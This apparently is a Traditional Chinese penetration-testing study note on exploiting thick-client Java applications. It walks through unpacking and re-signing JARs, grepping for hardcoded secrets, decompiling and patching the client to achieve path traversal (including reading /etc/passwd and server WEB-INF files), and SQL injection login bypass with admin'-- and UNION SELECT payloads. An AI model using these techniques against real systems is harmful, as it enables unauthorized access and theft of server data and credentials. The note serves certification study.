# 第 44B 章 - 利用胖客戶端應用程式中的 Web 漏洞

## 標籤

- #cpts
- #chapter
- #web
- #thick-client
- #path-traversal
- #sqli
- #java

## 學習目標

- 理解三層式胖客戶端仍承受典型 Web 漏洞（路徑遍歷、SQLi、授權繞過）。
- 能解壓 JAR、讀設定檔、找端點與 hardcoded secrets。
- 能用 JD-GUI 反編譯 Java class 找出伺服器端入口。
- 能修改客戶端邏輯、重打包並驗證伺服器端缺陷。

---

## 理論基礎

```text
三層式胖客戶端架構：
  [GUI 客戶端（JAR/EXE）] → HTTP/自訂協定 → [應用伺服器] → [資料庫]

關鍵認知：
  - GUI 灰掉的按鈕 ≠ 伺服器端授權
  - 客戶端過濾 ≠ 伺服器端驗證
  - JAR 可反編譯 → 半透明盒測試

攻擊鏈：
  取得客戶端安裝檔
      → 解壓 JAR / 讀設定
      → 找連線端點、秘密值
      → 反編譯邏輯
      → 修改限制 + 重打包
      → 驗證伺服器缺陷
```

---

## 方法一：取得客戶端並觀察流量

```bash
# 從 FTP / SMB 下載安裝檔
ftp TARGET_IP
# 或
smbclient //TARGET_IP/Share -N
# -N → 不提示密碼（匿名）
get client.jar

# 執行客戶端並用 Wireshark 觀察流量
# 過濾目標主機流量
wireshark &
# filter: ip.addr == TARGET_IP

# 或用 tcpdump 抓封包
tcpdump -i eth0 -w /tmp/thick.pcap host TARGET_IP
```

---

## 方法二：解壓 JAR 找設定與秘密值

```bash
# JAR 本質上是 ZIP，直接解壓
mkdir /tmp/jar_extracted
cd /tmp/jar_extracted
jar xf /path/to/client.jar
# jar xf → 解壓（x=extract, f=file）

# 或用 unzip
unzip /path/to/client.jar -d /tmp/jar_extracted

# 找設定檔（常見藏匿位置）
find /tmp/jar_extracted -name "*.xml" -o -name "*.properties" \
  -o -name "*.json" -o -name "*.yml" | head -20

# 看常見設定檔
cat /tmp/jar_extracted/beans.xml
cat /tmp/jar_extracted/config.properties
cat /tmp/jar_extracted/META-INF/MANIFEST.MF
# MANIFEST.MF → 含主類別（Main-Class）與相依性

# 找 hardcoded 端點、密碼、API key
grep -r "http" /tmp/jar_extracted --include="*.xml" --include="*.properties"
grep -ri "password\|secret\|key\|token" /tmp/jar_extracted \
  --include="*.xml" --include="*.properties" --include="*.json"
```

---

## 方法三：移除簽章（讓修改後 JAR 可執行）

```bash
# JAR 若有簽章，修改後執行會失敗（簽章驗證不符）
# 移除簽章相關檔案
rm /tmp/jar_extracted/META-INF/*.SF   # 簽章描述檔
rm /tmp/jar_extracted/META-INF/*.RSA  # RSA 簽章
rm /tmp/jar_extracted/META-INF/*.DSA  # DSA 簽章（若有）

# 重打包（不含簽章）
cd /tmp/jar_extracted
jar cf /tmp/client_modified.jar .
# jar cf → 建立新 JAR（c=create, f=file）
# . → 打包當前目錄所有內容

# 測試修改後 JAR 是否可執行
java -jar /tmp/client_modified.jar
```

---

## 方法四：反編譯 Java class 找漏洞邏輯

```bash
# 安裝 JD-GUI（圖形介面反編譯器）
# 或用 cfr（命令列，較穩定）
java -jar cfr.jar /tmp/jar_extracted/com/example/FileService.class \
  --outputdir /tmp/decompiled/
# 找到感興趣的 class 後反編譯

# 在解壓的 class 中 grep 關鍵字
# 找檔案操作（路徑遍歷目標）
grep -r "showFiles\|getFile\|download\|folder" \
  /tmp/jar_extracted --include="*.class" -l
# -l → 只顯示含匹配的檔名

# 找資料庫查詢（SQL 注入目標）
grep -r "SELECT\|INSERT\|username\|password" \
  /tmp/decompiled --include="*.java"
```

---

## 方法五：路徑遍歷（修改資料夾參數）

```bash
# 情境：GUI 只允許選 configs / mail / notes 資料夾
# 反編譯後發現：showFiles(folder) 直接把 folder 送往伺服器
# 目標：把 folder 改成 .. 測試是否遍歷上層目錄

# 找到負責呼叫的 class（例如 FileService.class）
# 修改反編譯後的 .java 檔，把硬編碼 "configs" 改成 ".."
# 重新編譯
javac -cp /tmp/jar_extracted \
  /tmp/decompiled/com/example/FileService.java
# -cp → classpath，指定相依 class 位置

# 複製修改後 class 回 JAR 目錄
cp /tmp/decompiled/com/example/FileService.class \
   /tmp/jar_extracted/com/example/

# 重打包並執行
jar cf /tmp/client_patched.jar -C /tmp/jar_extracted .
java -jar /tmp/client_patched.jar

# 若伺服器回傳上層目錄內容 → 路徑遍歷成立
# 繼續測試 ../../ 或 ../../../etc/passwd
```

---

## 方法六：下載伺服器端檔案（能力延伸）

```bash
# 若 open(folder, filename) 方法可被修改
# 把 filename 改成伺服器端的 JAR 或設定檔

# 修改 class，將請求的 filename 改為目標
# 例如：../webapps/ROOT/WEB-INF/web.xml
# 或：../lib/server.jar

# 重打包後執行，若客戶端顯示或儲存了該檔案
# → 可取得伺服器端原始碼或部署設定
```

---

## 方法七：SQL 注入（字串拼接登入）

```bash
# 反編譯後發現類似登入查詢：
# String query = "SELECT * FROM users WHERE username='" + username + "'";

# 確認密碼是否在客戶端被雜湊
# 若是 MD5：echo -n "password" | md5sum → 32 char hex
# 若明文送出：直接注入

# 傳統 SQLi 繞過（若後端只查詢不做密碼再比對）
username: admin'--
# 若後端仍把查到的密碼與客戶端送來的值比對 → 此法無效

# UNION SELECT 偽造使用者資料（含已知密碼與高權限角色）
# 目標：讓後端查到一筆自己構造的資料
username: ' UNION SELECT 1,'admin','KNOWN_HASH','administrator'--
# 客戶端配合送出對應 KNOWN_HASH 的原始密碼

# 若密碼在客戶端被 MD5 雜湊後才送出
# 先計算 MD5
echo -n "mypassword" | md5sum
# 然後在 UNION SELECT 中填入對應的雜湊值
```

---

## 決策流程

```
取得胖客戶端（JAR/EXE）
    ↓
執行 + Wireshark 看連線端點與埠口
    ↓
jar xf 解壓 → 讀設定檔、MANIFEST、grep secrets
    ↓
修補端點設定 → 移除簽章 → 重打包測試連線
    ↓
反編譯目標 class → 找檔案操作 / SQL 查詢
    ↓
路徑遍歷：修改資料夾參數 → 重打包 → 測試伺服器回應
    ↓
SQL 注入：分析查詢結構 + 密碼處理方式 → 構造 payload
    ↓
確認伺服器端接受非預期輸入 → finding
```

---

## 速查表

```bash
# 解壓 JAR
jar xf client.jar

# 移除簽章
rm META-INF/*.SF META-INF/*.RSA META-INF/*.DSA

# 重打包
jar cf client_modified.jar -C extracted_dir .

# 反編譯（cfr）
java -jar cfr.jar Target.class --outputdir /tmp/decompiled/

# 重新編譯修改後的 .java
javac -cp extracted_dir Target.java

# grep 找 SQL 查詢
grep -r "SELECT\|username" /tmp/decompiled --include="*.java"

# grep 找檔案操作
grep -r "showFiles\|getFile\|folder" /tmp/decompiled --include="*.java"
```

---

## 關聯筆記

- [[44-網站攻擊|第 44 章 - 網站攻擊]]
- [[41-命令注入|第 41 章 - 命令注入]]
- [[38-SQL注入|第 38 章 - SQL 注入]]
- [[40-檔案包含與上傳|第 40 章 - 檔案包含與上傳]]
